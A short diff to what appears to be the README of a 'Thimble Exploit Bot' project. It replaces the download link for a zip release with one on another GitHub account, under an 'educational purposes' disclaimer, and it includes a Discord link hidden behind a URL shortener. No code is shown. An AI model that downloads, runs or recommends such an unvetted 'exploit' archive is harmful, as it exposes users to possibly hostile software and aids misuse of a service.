@@ -5,7 +5,7 @@
 ## ⚠️  DISCLAIMER
 This project was made for educational purposes and personal use. You hold responsibility, liability and accountability for any consequences caused by your actions.
 
-# 📁[Download Click](https://github.com/L3MO1337/Thimble-Exploit-Bot-4.0/releases/download/download/ThimbleExploit.zip)
+# 📁[Download Click](https://github.com/Rtyn1337/Thimble-bot-4.1/releases/download/Download/Exploit4.1.zip)
 
 # 🌌[Discord](https://shorturl.at/jmL12)
 
